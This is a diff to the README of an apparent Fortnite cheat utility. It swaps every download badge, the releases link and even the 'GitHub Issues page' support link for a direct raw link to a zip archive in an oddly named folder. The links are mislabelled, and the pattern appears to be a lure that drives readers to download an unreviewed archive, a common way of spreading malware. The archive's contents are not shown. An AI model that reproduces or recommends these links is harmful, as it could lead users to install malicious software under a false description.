@@ -1,6 +1,6 @@
 # 🎮 utility-for-fortnite-peek-script - Customize Your Fortnite Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/releases)
+[![Download Now](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page.
 
-   [Download from Releases](https://github.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/releases)
+   [Download from Releases](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip)
 
 2. **Select the Latest Release**: Choose the most recent version listed on the page.
 
@@ -64,7 +64,7 @@ To get started, follow these simple steps:
 
 ## 📞 Support
 
-For support or questions regarding the software, please raise an issue on our [GitHub Issues page](https://github.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/issues). Our team will assist you as soon as possible.
+For support or questions regarding the software, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip). Our team will assist you as soon as possible.
 
 ## 📜 License
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. You can modify and distribute th
 
 If you find this project useful, consider following us on GitHub. We appreciate your support and feedback! 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/releases)
+[![Download Now](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kenshigenesis-jpg/utility-for-fortnite-peek-script/main/histometabasis/utility-for-fortnite-peek-script_1.0.zip)
